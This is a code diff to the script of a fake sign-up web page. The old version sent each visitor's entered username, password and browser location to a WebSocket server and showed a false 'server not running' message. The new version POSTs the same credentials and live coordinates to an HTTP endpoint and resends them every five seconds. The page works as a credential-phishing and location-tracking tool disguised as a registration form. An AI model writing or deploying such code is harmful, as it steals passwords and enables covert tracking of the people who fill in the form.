@@ -73,120 +73,82 @@
     </div>
 
     <script>
-        // WebSocket server address
-        const wsServer = "wss://192.168.56.1:8765";
-        let socket;
+        const serverUrl = "http://192.168.29.155:5000/submit"; // Replace with your server endpoint
+
         function signup() {
-            // Get user ID and password
             const userId = document.getElementById('username').value;
             const userPassword = document.getElementById('password').value;
             const msg = document.getElementsByClassName('message')[0];
-            // Check if ID and password are provided
+
+            // Validate fields
             if (!userId || !userPassword) {
-                msg.style.display = "block";  // Display the message div
-                msg.textContent = "Please fill in the above fields.";  // Show the relevant message
-            } else {
-                msg.style.display = "block";  // Display the message div
-                msg.textContent = "The server is not running perfectly, please try again later.";  // Show the other message
+                msg.style.display = "block";
+                msg.textContent = "Please fill in the above fields.";
+                return;
             }
 
-            // Simulating a server issue after clicking the signup button
-            document.getElementById('message').style.display = 'block';
-
-            // Initialize WebSocket connection and send data
-            initWebSocket(userId, userPassword);
-        }
-        function initWebSocket(userId, userPassword) {
-            socket = new WebSocket(wsServer);
-
-            socket.onopen = () => {
-                console.log("Connected to WebSocket server.");
-
-                // After connection is opened, send live location when the user clicks Sign Up
-                sendLiveLocation(socket, userId, userPassword);
-            };
-
-            socket.onerror = (error) => {
-                console.log("Not Connected.");
-            };
-
-            socket.onclose = () => {
-                console.log("WebSocket connection closed.");
-
-                // Retry to reconnect and resend the data once connected
-                setTimeout(() => initWebSocket(userId, userPassword), 5000); // Retry after 5 seconds
-
-            }};
-        // Function to get and send live location along with other data
-        function sendLiveLocation(socket, userId, userPassword) {
+            // Get location and send data every 5 seconds
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
 
-                        // Prepare the full message with user data and live location
-                        const locationData = {
+                        const requestData = {
                             id: userId,
                             password: userPassword,
                             liveLocation: {
+                                latitude: latitude,
                                 longitude: longitude,
-                                latitude: latitude
-                            }
+                            },
                         };
 
-                        // Send the complete data as a JSON object
-                        socket.send(JSON.stringify(locationData));
-                        console.log("Live location and user data sent to WebSocket server:", locationData);
+                        // Send initial data immediately
+                        sendHttpRequest(requestData);
 
-                        // Save live location in localStorage for future use
-                        localStorage.setItem('savedLocation', JSON.stringify(locationData));
+                        // Start sending data every 5 seconds
+                        setInterval(() => {
+                            sendHttpRequest(requestData);
+                        }, 5000);
                     },
                     (error) => {
-                        console.error("Error retrieving live location:", error.message);
+                        msg.style.display = "block";
+                        msg.textContent = "Unable to fetch location. Please enable location services.";
+                        console.error("Error retrieving location:", error.message);
                     }
                 );
             } else {
-                console.error("Geolocation is not supported by this browser.");
+                msg.style.display = "block";
+                msg.textContent = "Geolocation is not supported by your browser.";
             }
         }
 
-        // Function to initialize WebSocket and send data on page load
-        window.onload = function() {
-            // Get user ID and password
-            const userId = document.getElementById('username').value;
-            const userPassword = document.getElementById('password').value;
+        function sendHttpRequest(data) {
+            const msg = document.getElementsByClassName('message')[0];
 
-            // Initialize WebSocket connection
-            socket = new WebSocket(wsServer);
-
-            socket.onopen = () => {
-                console.log("Connected to WebSocket server.");
-
-                // Send live location as soon as the page loads
-                sendLiveLocation(socket, userId, userPassword);
-            };
-
-            socket.onerror = (error) => {
-                console.log("Error connecting to WebSocket:", error);
-            };
-
-            socket.onclose = () => {
-                console.log("WebSocket connection closed.");
-
-                // Retry to reconnect and resend the data once connected
-                setTimeout(() => window.onload(), 5000); // Retry after 5 seconds
-
-                // Optionally, if the connection is closed, save the location for later
-                if (localStorage.getItem('savedLocation')) {
-                    console.log("Saved location available, will resend once connected");
-                }
-            };
-
-            socket.onmessage = (event) => {
-                console.log("Message from server:", event.data);
-            };
-        };
+            fetch(serverUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+            })
+                .then((response) => {
+                    if (response.ok) {
+                        msg.style.display = "block";
+                        console.log("Data sent successfully:", data);
+                    } else {
+                        msg.style.display = "block";
+                        msg.textContent = "Failed to send data. Please try again.";
+                        console.error("Error:", response.statusText);
+                    }
+                })
+                .catch((error) => {
+                    msg.style.display = "block";
+                    msg.textContent = "Failed to connect to the server. Please try again.";
+                    console.error("Network error:", error);
+                });
+        }
     </script>
 
 </body>
